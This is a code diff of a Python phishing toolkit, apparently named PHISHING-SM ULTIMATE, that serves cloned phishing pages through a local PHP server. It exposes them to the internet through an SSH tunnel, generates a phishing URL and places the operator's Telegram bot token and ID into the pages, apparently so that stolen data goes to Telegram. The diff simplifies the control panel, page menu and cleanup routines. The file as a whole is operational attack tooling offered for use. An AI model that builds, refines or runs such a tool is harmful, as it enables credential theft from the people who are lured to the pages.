+            self.print_color(f"[+] Tunnel URL  : {Colors.WHITE}{self.tunnel_url}{Colors.NC}", Colors.GREEN)
         
-        # SSH tunnel status
-        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
-            print(f"{Colors.GREEN}[✓] SSH Tunnel: {Colors.WHITE}Running in TMUX session{Colors.NC}")
-        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
-            print(f"{Colors.GREEN}[✓] SSH Tunnel: {Colors.WHITE}Running (PID: {self.ssh_pid}){Colors.NC}")
-        else:
-            print(f"{Colors.RED}[-] SSH Tunnel: {Colors.WHITE}Not running{Colors.NC}")
-        
-        # URL status
         if Path('generated_url.txt').exists():
             with open('generated_url.txt', 'r') as f:
                 final_url = f.read().strip()
-            print(f"{Colors.GREEN}[✓] Phishing URL: {Colors.WHITE}{final_url}{Colors.NC}")
+            self.print_color(f"[+] Phishing URL: {Colors.WHITE}{final_url}{Colors.NC}", Colors.GREEN)
+        
+        if self.php_pid:
+            self.print_color(f"[+] PHP Server   : {Colors.WHITE}Running on port {self.php_port} (PID: {self.php_pid}){Colors.NC}", Colors.GREEN)
+        
+        # Check SSH tunnel status
+        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
+            self.print_color("[+] SSH Tunnel   : Running in TMUX session: phishing-tunnel", Colors.GREEN)
+        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
+            self.print_color(f"[+] SSH Tunnel   : Running with PID: {self.ssh_pid}", Colors.GREEN)
+        else:
+            self.print_color("[-] SSH Tunnel   : Not running", Colors.RED)
         
         self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
 
-    def interactive_control_panel(self):
-        """Enhanced interactive control panel with real-time monitoring"""
-        self.print_color(f"\n{Colors.YELLOW}[!] Starting enhanced interactive control panel...{Colors.NC}")
-        self.print_color(f"{Colors.GREEN}[+] Services are now active and monitored{Colors.NC}")
+    def wait_for_services(self):
+        """Monitor services and provide interactive control"""
+        self.services_running = True
+        self.print_color(f"\n{Colors.YELLOW}[!] Services are now running...{Colors.NC}")
         
-        # Start monitoring threads
-        self.start_service_monitors()
+        has_tmux = self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0
         
-        # Display control options
-        while True:
-            self.display_control_menu()
-            
+        while self.services_running:
             try:
-                choice = input(f"\n{Colors.GREEN}[CONTROL] Enter command: {Colors.NC}").strip().lower()
+                self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ CONTROL PANEL ═══════════════════════════{Colors.NC}")
                 
-                if choice in ['q', 'quit', 'exit']:
-                    self.print_color(f"{Colors.YELLOW}[!] Stopping services...{Colors.NC}")
+                if has_tmux:
+                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
+                    self.print_color("[+] SSH Tunnel TMUX: phishing-tunnel", Colors.CYAN)
+                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
+                    self.print_color("[!] Commands: [q]uit [t]mux [r]efresh [u]rl [s]tatus [b]ack", Colors.YELLOW)
+                else:
+                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
+                    if self.ssh_pid:
+                        self.print_color(f"[+] SSH Tunnel PID: {self.ssh_pid}", Colors.CYAN)
+                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
+                    self.print_color("[!] Commands: [q]uit [r]efresh [u]rl [l]ogs [s]tatus [b]ack", Colors.YELLOW)
+                
+                self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
+                
+                if has_tmux:
+                    prompt = "Enter command (q/t/r/u/s/b): "
+                else:
+                    prompt = "Enter command (q/r/u/l/s/b): "
+                
+                user_input = input(f"{Colors.GREEN}[+]{Colors.NC} {prompt}").strip().lower()
+                
+                if user_input == 'q':
+                    self.print_color("[!] Stopping services...", Colors.YELLOW)
+                    self.stop_services()
+                    self.services_running = False
                     break
                 
-                self.handle_control_command(choice)
+                elif user_input == 't' and has_tmux:
+                    self.print_color("[+] Attaching to TMUX tunnel session...", Colors.CYAN)
+                    self.print_color("[!] To detach from TMUX: Ctrl+B then D", Colors.YELLOW)
+                    subprocess.run("tmux attach -t phishing-tunnel", shell=True)
+                    self.print_color("[+] Returned from TMUX session", Colors.CYAN)
+                
+                elif user_input == 'r':
+                    self.refresh_status()
+                
+                elif user_input == 'u':
+                    if Path('generated_url.txt').exists():
+                        with open('generated_url.txt', 'r') as f:
+                            final_url = f.read().strip()
+                        self.print_color(f"[+] Current URL: {final_url}", Colors.GREEN)
+                    else:
+                        self.print_color("[-] No URL generated", Colors.RED)
+                
+                elif user_input == 'l' and not has_tmux and self.ssh_pid:
+                    log_files = list(Path('.').glob('ssh_tunnel_*.log'))
+                    if log_files:
+                        latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
+                        self.print_color(f"[+] Showing SSH tunnel logs from {latest_log}:", Colors.CYAN)
+                        with open(latest_log, 'r') as f:
+                            lines = f.readlines()[-20:]
+                            print(''.join(lines))
+                    else:
+                        self.print_color("[-] No SSH tunnel log file found", Colors.RED)
+                
+                elif user_input == 's':
+                    self.display_results()
+                
+                elif user_input == 'b':
+                    self.print_color("[!] Returning to main menu...", Colors.YELLOW)
+                    self.stop_services()
+                    self.services_running = False
+                    break
                 
                 # Check if services are still running
-                if not self.are_services_healthy():
-                    self.print_color(f"{Colors.RED}[!] Services are not healthy, restarting...{Colors.NC}")
-                    self.restart_services()
+                if not self.is_process_running(self.php_pid):
+                    self.print_color("[-] PHP server stopped unexpectedly", Colors.RED)
+                    self.services_running = False
+                    break
                 
+                if has_tmux:
+                    if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
+                        self.print_color("[-] SSH tunnel stopped unexpectedly", Colors.RED)
+                        self.services_running = False
+                        break
+                elif self.ssh_pid and not self.is_process_running(self.ssh_pid):
+                    self.print_color("[-] SSH tunnel stopped unexpectedly", Colors.RED)
+                    self.services_running = False
+                    break
+                    
             except (KeyboardInterrupt, EOFError):
-                self.print_color(f"\n{Colors.YELLOW}[!] Control panel interrupted{Colors.NC}")
+                self.print_color("\n[!] Stopping services...", Colors.YELLOW)
+                self.stop_services()
+                self.services_running = False
                 break
-            except Exception as e:
-                self.print_color(f"{Colors.RED}[ERROR] Control command failed: {str(e)}{Colors.NC}")
+
+    def refresh_status(self):
+        """Refresh and display service status"""
+        self.print_color("[+] Refreshing service status...", Colors.CYAN)
         
-        self.stop_service_monitors()
-
-    def display_control_menu(self):
-        """Display enhanced control menu"""
-        menu = f"""
-{Colors.BG_CYAN}{Colors.WHITE} ENHANCED CONTROL PANEL {Colors.NC}
-
-{Colors.GREEN}Service Control:{Colors.NC}
-  {Colors.GREEN}[q]{Colors.WHITE} Quit and stop all services
-  {Colors.GREEN}[r]{Colors.WHITE} Restart all services
-  {Colors.GREEN}[s]{Colors.WHITE} Service status
-  {Colors.GREEN}[t]{Colors.WHITE} Test URL accessibility
-
-{Colors.GREEN}Monitoring:{Colors.NC}
-  {Colors.GREEN}[l]{Colors.WHITE} View PHP server logs
-  {Colors.GREEN}[ssh]{Colors.WHITE} View SSH tunnel logs
-  {Colors.GREEN}[tmux]{Colors.WHITE} Attach to TMUX session
-
-{Colors.GREEN}URL Management:{Colors.NC}
-  {Colors.GREEN}[u]{Colors.WHITE} Show generated URL
-  {Colors.GREEN}[qr]{Colors.WHITE} Regenerate QR code
-  {Colors.GREEN}[c]{Colors.WHITE} Copy URL to clipboard
-
-{Colors.GREEN}Debugging:{Colors.NC}
-  {Colors.GREEN}[d]{Colors.WHITE} Debug information
-  {Colors.GREEN}[h]{Colors.WHITE} Health check
-  {Colors.GREEN}[log]{Colors.WHITE} View system log
-"""
-        print(menu)
-
-    def handle_control_command(self, command):
-        """Handle control panel commands"""
-        command_handlers = {
-            'r': self.restart_services,
-            's': self.show_service_status,
-            't': self.test_url_accessibility,
-            'l': self.view_php_logs,
-            'ssh': self.view_ssh_logs,
-            'tmux': self.attach_tmux_session,
-            'u': self.show_generated_url,
-            'qr': self.regenerate_qr_code,
-            'c': self.copy_url_to_clipboard,
-            'd': self.show_debug_info,
-            'h': self.health_check,
-            'log': self.view_system_log
-        }
-        
-        handler = command_handlers.get(command)
-        if handler:
-            handler()
-        else:
-            self.print_color(f"{Colors.RED}[!] Unknown command: {command}{Colors.NC}")
-
-    def start_service_monitors(self):
-        """Start background service monitors"""
-        self.monitoring = True
-        self.monitor_thread = threading.Thread(target=self.service_monitor_loop)
-        self.monitor_thread.daemon = True
-        self.monitor_thread.start()
-
-    def service_monitor_loop(self):
-        """Background service monitoring loop"""
-        while getattr(self, 'monitoring', False):
+        # Check PHP server
+        if self.php_pid and self.is_process_running(self.php_pid):
+            self.print_color(f"[✓] PHP Server running (PID: {self.php_pid})", Colors.GREEN)
             try:
-                if not self.are_services_healthy():
-                    self.log_event("Service health check failed", "WARNING")
-                time.sleep(10)
+                response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=2)
+                self.print_color("[✓] PHP Server is responding", Colors.GREEN)
             except:
-                pass
-
-    def stop_service_monitors(self):
-        """Stop background monitors"""
-        self.monitoring = False
-
-    def are_services_healthy(self):
-        """Check if all services are healthy"""
-        try:
-            # Check PHP server
-            if not self.php_pid or not self.is_process_running(self.php_pid):
-                return False
-            
-            # Check PHP server responsiveness
-            response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=5)
-            if response.status_code != 200:
-                return False
-            
-            # Check SSH tunnel
-            if self.check_command_exists('tmux'):
-                if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
-                    return False
-            elif self.ssh_pid and not self.is_process_running(self.ssh_pid):
-                return False
-            
-            return True
-            
-        except:
-            return False
-
-    def restart_services(self):
-        """Restart all services"""
-        self.print_color(f"{Colors.YELLOW}[!] Restarting all services...{Colors.NC}")
-        self.stop_services_enhanced()
-        time.sleep(2)
-        
-        if self.start_php_server_enhanced() and self.start_ssh_tunnel_enhanced():
-            self.generate_enhanced_url()
-            self.display_enhanced_results()
-            self.print_color(f"{Colors.GREEN}[✓] Services restarted successfully{Colors.NC}")
+                self.print_color("[-] PHP Server is not responding", Colors.RED)
         else:
-            self.print_color(f"{Colors.RED}[-] Failed to restart services{Colors.NC}")
-
-    def show_service_status(self):
-        """Show detailed service status"""
-        self.print_color(f"{Colors.CYAN}[+] Service Status:{Colors.NC}")
+            self.print_color("[-] PHP Server not running", Colors.RED)
         
-        # PHP Server status
-        php_status = f"{Colors.GREEN}Running{Colors.NC}" if self.php_pid and self.is_process_running(self.php_pid) else f"{Colors.RED}Stopped{Colors.NC}"
-        print(f"  PHP Server: {php_status} (PID: {self.php_pid})")
+        # Check SSH tunnel
+        has_tmux = self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0
         
-        # SSH Tunnel status
-        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
-            print(f"  SSH Tunnel: {Colors.GREEN}Running in TMUX{Colors.NC}")
+        if has_tmux:
+            self.print_color("[✓] SSH Tunnel running in TMUX", Colors.GREEN)
+            if self.tunnel_url:
+                self.print_color(f"[✓] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
+                try:
+                    response = requests.get(self.tunnel_url, timeout=5)
+                    self.print_color("[✓] Tunnel URL is accessible", Colors.GREEN)
+                except:
+                    self.print_color("[-] Tunnel URL is not accessible", Colors.RED)
         elif self.ssh_pid and self.is_process_running(self.ssh_pid):
-            print(f"  SSH Tunnel: {Colors.Green}Running{Colors.NC} (PID: {self.ssh_pid})")
+            self.print_color(f"[✓] SSH Tunnel running (PID: {self.ssh_pid})", Colors.GREEN)
+            if self.tunnel_url:
+                self.print_color(f"[✓] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
+                try:
+                    response = requests.get(self.tunnel_url, timeout=5)
+                    self.print_color("[✓] Tunnel URL is accessible", Colors.GREEN)
+                except:
+                    self.print_color("[-] Tunnel URL is not accessible", Colors.RED)
         else:
-            print(f"  SSH Tunnel: {Colors.RED}Stopped{Colors.NC}")
-        
-        # URL status
-        if Path('generated_url.txt').exists():
-            with open('generated_url.txt', 'r') as f:
-                url = f.read().strip()
-            print(f"  Phishing URL: {Colors.GREEN}Active{Colors.NC}")
-            print(f"  URL: {url}")
-
-    def test_url_accessibility(self):
-        """Test URL accessibility"""
-        if not Path('generated_url.txt').exists():
-            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
-            return
-        
-        with open('generated_url.txt', 'r') as f:
-            url = f.read().strip()
-        
-        self.print_color(f"{Colors.CYAN}[+] Testing URL: {url}{Colors.NC}")
-        
-        try:
-            response = requests.get(url, timeout=10)
-            if response.status_code == 200:
-                self.print_color(f"{Colors.GREEN}[✓] URL is accessible (HTTP 200){Colors.NC}")
-            else:
-                self.print_color(f"{Colors.YELLOW}[!] URL returned HTTP {response.status_code}{Colors.NC}")
-        except Exception as e:
-            self.print_color(f"{Colors.RED}[-] URL test failed: {str(e)}{Colors.NC}")
-
-    def view_php_logs(self):
-        """View PHP server logs"""
-        log_files = ['php_server.log'] + list(Path('.').glob('php_*.log'))
-        
-        for log_file in log_files:
-            if Path(log_file).exists():
-                self.print_color(f"{Colors.CYAN}[+] PHP Log ({log_file}):{Colors.NC}")
-                with open(log_file, 'r') as f:
-                    lines = f.readlines()[-20:]  # Last 20 lines
-                    for line in lines:
-                        print(f"  {line.strip()}")
-                return
-        
-        self.print_color(f"{Colors.YELLOW}[!] No PHP log files found{Colors.NC}")
-
-    def view_ssh_logs(self):
-        """View SSH tunnel logs"""
-        log_files = list(Path('.').glob('ssh_tunnel_*.log'))
-        
-        if log_files:
-            latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
-            self.print_color(f"{Colors.CYAN}[+] SSH Log ({latest_log}):{Colors.NC}")
-            with open(latest_log, 'r') as f:
-                lines = f.readlines()[-15:]  # Last 15 lines
-                for line in lines:
-                    print(f"  {line.strip()}")
-        else:
-            self.print_color(f"{Colors.YELLOW}[!] No SSH log files found{Colors.NC}")
-
-    def attach_tmux_session(self):
-        """Attach to TMUX session"""
-        if not self.check_command_exists('tmux'):
-            self.print_color(f"{Colors.RED}[-] TMUX not available{Colors.NC}")
-            return
-        
-        if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
-            self.print_color(f"{Colors.RED}[-] No TMUX session found{Colors.NC}")
-            return
-        
-        self.print_color(f"{Colors.CYAN}[+] Attaching to TMUX session...{Colors.NC}")
-        self.print_color(f"{Colors.YELLOW}[!] To detach: Ctrl+B, then D{Colors.NC}")
-        subprocess.run("tmux attach -t phishing-tunnel", shell=True)
-
-    def show_generated_url(self):
-        """Show generated URL"""
-        if not Path('generated_url.txt').exists():
-            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
-            return
-        
-        with open('generated_url.txt', 'r') as f:
-            url = f.read().strip()
-        
-        self.print_color(f"{Colors.GREEN}[+] Generated URL: {url}{Colors.NC}")
-
-    def regenerate_qr_code(self):
-        """Regenerate QR code"""
-        if not Path('generated_url.txt').exists():
-            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
-            return
-        
-        with open('generated_url.txt', 'r') as f:
-            url = f.read().strip()
-        
-        self.generate_qr_code(url)
-
-    def copy_url_to_clipboard(self):
-        """Copy URL to clipboard"""
-        if not Path('generated_url.txt').exists():
-            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
-            return
-        
-        with open('generated_url.txt', 'r') as f:
-            url = f.read().strip()
-        
-        # Try different clipboard methods
-        clipboard_commands = [
-            f"echo '{url}' | xclip -selection clipboard",  # Linux with xclip
-            f"echo '{url}' | xsel --clipboard --input",    # Linux with xsel
-            f"echo '{url}' | pbcopy",                      # macOS
-            f"echo '{url}' | clip",                        # Windows
-        ]
-        
-        for cmd in clipboard_commands:
-            try:
-                result = subprocess.run(cmd, shell=True, capture_output=True)
-                if result.returncode == 0:
-                    self.print_color(f"{Colors.GREEN}[✓] URL copied to clipboard{Colors.NC}")
-                    return
-            except:
-                continue
-        
-        self.print_color(f"{Colors.YELLOW}[!] Could not copy to clipboard{Colors.NC}")
-        self.print_color(f"{Colors.YELLOW}[!] Install xclip or xsel on Linux{Colors.NC}")
-
-    def show_debug_info(self):
-        """Show debug information"""
-        self.print_color(f"{Colors.CYAN}[+] Debug Information:{Colors.NC}")
-        print(f"  PHP PID: {self.php_pid}")
-        print(f"  SSH PID: {self.ssh_pid}")
-        print(f"  PHP Port: {self.php_port}")
-        print(f"  Tunnel URL: {self.tunnel_url}")
-        print(f"  Selected Page: {self.selected_page}")
-        print(f"  User ID: {self.user_id}")
-        print(f"  Token: {'*' * 10}{self.current_token[-4:] if self.current_token else 'None'}")
-        print(f"  System: {sys.platform}")
-        print(f"  Termux: {self.is_termux}")
-        print(f"  Kali: {self.is_kali}")
-
-    def health_check(self):
-        """Perform health check"""
-        self.print_color(f"{Colors.CYAN}[+] Performing health check...{Colors.NC}")
-        
-        checks = [
-            ("PHP Server Process", self.php_pid and self.is_process_running(self.php_pid)),
-            ("SSH Tunnel Process", self.ssh_pid and self.is_process_running(self.ssh_pid) or 
-             (self.check_command_exists('tmux') and 
-              subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0)),
-            ("PHP Server Responsive", self.test_php_responsive()),
-            ("Tunnel URL Accessible", self.test_tunnel_accessible()),
-            ("Generated URL File", Path('generated_url.txt').exists())
-        ]
-        
-        all_healthy = True
-        for check_name, status in checks:
-            status_icon = f"{Colors.GREEN}✓{Colors.NC}" if status else f"{Colors.RED}✗{Colors.NC}"
-            status_text = f"{Colors.GREEN}Healthy{Colors.NC}" if status else f"{Colors.RED}Unhealthy{Colors.NC}"
-            print(f"  {status_icon} {check_name}: {status_text}")
-            if not status:
-                all_healthy = False
-        
-        if all_healthy:
-            self.print_color(f"{Colors.GREEN}[✓] All systems healthy{Colors.NC}")
-        else:
-            self.print_color(f"{Colors.YELLOW}[!] Some systems need attention{Colors.NC}")
-
-    def test_php_responsive(self):
-        """Test PHP server responsiveness"""
-        try:
-            response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=5)
-            return response.status_code == 200
-        except:
-            return False
-
-    def test_tunnel_accessible(self):
-        """Test tunnel accessibility"""
-        if not self.tunnel_url:
-            return False
-        
-        try:
-            response = requests.get(self.tunnel_url, timeout=10)
-            return response.status_code == 200
-        except:
-            return False
-
-    def view_system_log(self):
-        """View system log"""
-        if not Path(self.log_file).exists():
-            self.print_color(f"{Colors.YELLOW}[!] No system log found{Colors.NC}")
-            return
-        
-        self.print_color(f"{Colors.CYAN}[+] System Log:{Colors.NC}")
-        with open(self.log_file, 'r') as f:
-            lines = f.readlines()[-30:]  # Last 30 lines
-            for line in lines:
-                print(f"  {line.strip()}")
+            self.print_color("[-] SSH Tunnel not running", Colors.RED)
 
     def cleanup(self):
-        """Enhanced cleanup with comprehensive resource management"""
-        self.print_color(f"\n{Colors.RED}[!] Performing enhanced cleanup...{Colors.NC}")
+        """Clean up resources and stop services"""
+        self.print_color("\n[!] Stopping all services and cleaning up...", Colors.RED)
+        self.stop_services()
         
-        # Stop all services
-        self.stop_services_enhanced()
-        
-        # Revert token
         if self.current_token:
-            self.print_color(f"{Colors.YELLOW}[!] Reverting token in PHP files...{Colors.NC}")
             self.revert_token()
         
-        # Stop monitoring
-        self.stop_service_monitors()
-        
-        # Cleanup temporary files
-        temp_files = [
-            'current_tunnel.url', 'generated_url.txt', 'generated_urls.txt',
-            'php_server.log', 'php_server.pid', 'ssh_tunnel.pid',
-            self.session_file
-        ]
-        
+        # Remove temporary files
+        temp_files = ['current_tunnel.url', 'generated_url.txt', 'php_server.log', 'php_server.pid', 'ssh_tunnel.pid']
         for temp_file in temp_files:
             if Path(temp_file).exists():
-                try:
-                    Path(temp_file).unlink()
-                    self.print_color(f"{Colors.GREEN}[✓] Removed: {temp_file}{Colors.NC}")
-                except:
-                    self.print_color(f"{Colors.YELLOW}[!] Failed to remove: {temp_file}{Colors.NC}")
+                Path(temp_file).unlink()
         
-        # Cleanup log files
+        # Remove SSH tunnel logs
         for log_file in Path('.').glob('ssh_tunnel_*.log'):
             try:
                 log_file.unlink()
             except:
                 pass
         
-        # Final verification
-        if self.current_token:
-            # Verify token is removed
-            token_found = False
-            for php_file in Path('.').glob('*.php'):
-                try:
-                    with open(php_file, 'r') as f:
-                        if self.current_token in f.read():
-                            token_found = True
-                            break
-                except:
-                    pass
-            
-            if not token_found:
-                self.print_color(f"{Colors.GREEN}[✓] Token successfully removed from all files{Colors.NC}")
-            else:
-                self.print_color(f"{Colors.RED}[-] Token still found in some files{Colors.NC}")
-        
-        self.print_color(f"{Colors.GREEN}[✓] Enhanced cleanup completed successfully{Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Thank you for using PHISHING-SM ULTIMATE{Colors.NC}")
+        self.print_color("[+] Cleanup completed. Goodbye!", Colors.GREEN)
 
-    def main_loop(self):
-        """Enhanced main loop with session management"""
+    def main(self):
+        """Main program loop"""
         self.print_banner()
         
-        # System compatibility announcement
-        if self.is_termux:
-            self.print_color(f"{Colors.GREEN}[+] Running in Termux environment{Colors.NC}")
-        if self.is_kali:
-            self.print_color(f"{Colors.GREEN}[+] Running in Kali Linux{Colors.NC}")
-        
-        # Check for PHP files
+        # Check if we're in the right directory with PHP files
         php_files = list(Path('.').glob('*.php'))
         if not php_files:
-            self.print_color(f"{Colors.RED}[ERROR] No PHP files found in current directory!{Colors.NC}")
-            self.print_color(f"{Colors.YELLOW}[!] Please ensure you're in the correct directory{Colors.NC}")
-            self.print_color(f"{Colors.YELLOW}[!] The tool requires PHP phishing pages{Colors.NC}")
+            self.print_color("[-] No PHP files found in current directory!", Colors.RED)
+            self.print_color("[!] Please make sure you're in the correct directory", Colors.YELLOW)
+            self.print_color("[!] The tool requires PHP phishing pages in the current directory", Colors.YELLOW)
             sys.exit(1)
         
-        # Enhanced dependency check
-        self.print_color(f"{Colors.CYAN}[+] Starting enhanced dependency check...{Colors.NC}")
+        # Check dependencies
         if not self.check_dependencies():
-            self.print_color(f"{Colors.RED}[ERROR] Critical dependencies missing{Colors.NC}")
-            if not self.is_termux:
-                self.print_color(f"{Colors.YELLOW}[!] Try: sudo apt update && sudo apt install php ssh curl{Colors.NC}")
-            else:
-                self.print_color(f"{Colors.YELLOW}[!] Try: pkg update && pkg install php openssh curl{Colors.NC}")
+            self.print_color("[-] Failed to install required dependencies. Exiting.", Colors.RED)
             sys.exit(1)
         
         # Check for SSH key
-        if not Path("id_rsa").exists():
-            self.print_color(f"{Colors.YELLOW}[!] SSH key (id_rsa) not found{Colors.NC}")
-            self.print_color(f"{Colors.YELLOW}[!] Using password authentication for tunnels{Colors.NC}")
+        if not Path('id_rsa').exists():
+            self.print_color("[!] SSH key (id_rsa) not found in current directory", Colors.YELLOW)
+            self.print_color("[!] The script will use alternative authentication methods", Colors.YELLOW)
         
         # Main interaction loop
         while True:
-            try:
-                # Token setup
-                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
-                
-                if self.current_token:
-                    use_previous = input(f"{Colors.YELLOW}[?] Use previous token? [{self.current_token[:10]}...] (y/n): {Colors.NC}").strip().lower()
-                    if use_previous in ['y', 'yes', '']:
-                        self.print_color(f"{Colors.GREEN}[+] Using previous token{Colors.NC}")
-                    else:
-                        self.current_token = ""
-                
-                if not self.current_token:
-                    while True:
-                        bot_token = input(f"{Colors.YELLOW}[+] Enter Bot Token: {Colors.NC}").strip()
-                        if self.validate_token(bot_token):
-                            self.current_token = bot_token
-                            self.save_session()
-                            break
-                
-                # User ID setup
-                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
-                
-                if self.user_id:
-                    use_previous = input(f"{Colors.YELLOW}[?] Use previous ID? [{self.user_id}] (y/n): {Colors.NC}").strip().lower()
-                    if use_previous in ['y', 'yes', '']:
-                        self.print_color(f"{Colors.GREEN}[+] Using previous ID{Colors.NC}")
-                    else:
-                        self.user_id = ""
-                
-                if not self.user_id:
-                    while True:
-                        user_id = input(f"{Colors.YELLOW}[+] Enter Your Telegram ID: {Colors.NC}").strip()
-                        if self.validate_id(user_id):
-                            self.user_id = user_id
-                            self.save_session()
-                            break
-                
-                # Token replacement
-                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TOKEN REPLACEMENT ════════════════════════{Colors.NC}")
-                self.search_and_replace_token(self.current_token)
-                
-                # Page selection
-                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
-                self.show_enhanced_pages_menu()
-                
-                while True:
-                    choice = input(f"{Colors.YELLOW}[+] Choose page [01-25, 00=help, 26=exit]: {Colors.NC}").strip()
-                    
-                    if choice == '00':
-                        self.show_help()
-                        self.show_enhanced_pages_menu()
-                        continue
-                    elif choice == '26':
-                        self.print_color(f"{Colors.RED}[!] Exiting...{Colors.NC}")
-                        self.cleanup()
-                        sys.exit(0)
-                    elif choice == '99':
-                        self.show_enhanced_pages_menu()
-                        continue
-                    elif choice in self.pages:
-                        self.selected_page = self.pages[choice]["file"]
-                        break
-                    else:
-                        self.print_color(f"{Colors.RED}[-] Invalid choice!{Colors.NC}")
-                
-                # Verify page exists
-                if not Path(self.selected_page).exists():
-                    self.print_color(f"{Colors.RED}[-] Page '{self.selected_page}' not found!{Colors.NC}")
-                    self.print_color(f"{Colors.YELLOW}[!] Available pages:{Colors.NC}")
-                    for php_file in php_files:
-                        self.print_color(f"  - {php_file}", Colors.WHITE)
-                    continue
-                
-                self.print_color(f"{Colors.GREEN}[+] Selected: {self.pages[choice]['name']} ({self.selected_page}){Colors.NC}")
-                
-                # Service management
-                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ SERVICE MANAGEMENT ════════════════════════{Colors.NC}")
-                
-                self.stop_services_enhanced()
-                
-                if self.start_php_server_enhanced() and self.start_ssh_tunnel_enhanced():
-                    if self.generate_enhanced_url():
-                        self.display_enhanced_results()
-                        self.interactive_control_panel()
-                else:
-                    self.print_color(f"{Colors.RED}[ERROR] Failed to start services{Colors.NC}")
-                    retry = input(f"{Colors.YELLOW}[?] Retry? (y/n): {Colors.NC}").strip().lower()
-                    if retry not in ['y', 'yes']:
-                        break
+            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
             
-            except KeyboardInterrupt:
-                self.print_color(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.NC}")
-                break
-            except Exception as e:
-                self.print_color(f"{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.NC}")
-                self.log_event(f"Main loop error: {str(e)}", "ERROR")
+            # Get bot token
+            while True:
+                bot_token = input(f"{Colors.YELLOW}[+] Enter Token BoT Telegram: {Colors.NC}").strip()
+                if self.validate_token(bot_token):
+                    self.print_color("[✓] Valid bot token format!", Colors.GREEN)
+                    self.current_token = bot_token
+                    break
+                else:
+                    self.print_color("[-] Invalid bot token format!", Colors.RED)
+                    self.print_color(f"[!] Format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789", Colors.YELLOW)
+                    self.print_color(f"[!] Your token: {bot_token}", Colors.YELLOW)
+                    self.print_color(f"[!] Length: {len(bot_token)} characters", Colors.YELLOW)
+            
+            # Get Telegram ID
+            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
+            while True:
+                user_id = input(f"{Colors.YELLOW}[+] Enter ID Your Telegram account: {Colors.NC}").strip()
+                if self.validate_id(user_id):
+                    self.print_color("[✓] Valid Telegram ID!", Colors.GREEN)
+                    self.user_id = user_id
+                    break
+                else:
+                    self.print_color("[-] Invalid Telegram ID! Must be numeric and at least 5 digits", Colors.RED)
+            
+            # Replace token in PHP files
+            self.search_and_replace_token(bot_token)
+            
+            # Page selection
+            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
+            self.show_pages_menu()
+            
+            while True:
+                choice = input(f"{Colors.YELLOW}[+] Choose the page you want to create [0-26]: {Colors.NC}").strip()
+                
+                if choice == '0':
+                    self.show_help()
+                    self.print_banner()
+                    self.show_pages_menu()
+                    continue
+                elif choice == '26':
+                    self.print_color("[!] Exiting...", Colors.RED)
+                    self.cleanup()
+                    sys.exit(0)
+                elif choice in self.pages:
+                    self.selected_page = self.pages[choice]
+                    break
+                else:
+                    self.print_color("[-] Invalid selection! Choose [0-26]", Colors.RED)
+            
+            # Check if page exists
+            if not Path(self.selected_page).exists():
+                self.print_color(f"[-] Page '{self.selected_page}' not found!", Colors.RED)
+                self.print_color("[!] Available PHP files in current directory:", Colors.YELLOW)
+                for php_file in php_files:
+                    self.print_color(f"    - {php_file}", Colors.WHITE)
                 continue
+            
+            self.print_color(f"[+] Selected page: {self.selected_page}", Colors.GREEN)
+            
+            # Stop any existing services
+            self.stop_services()
+            
+            # Start PHP server
+            if not self.start_php_server():
+                continue
+            
+            # Start SSH tunnel
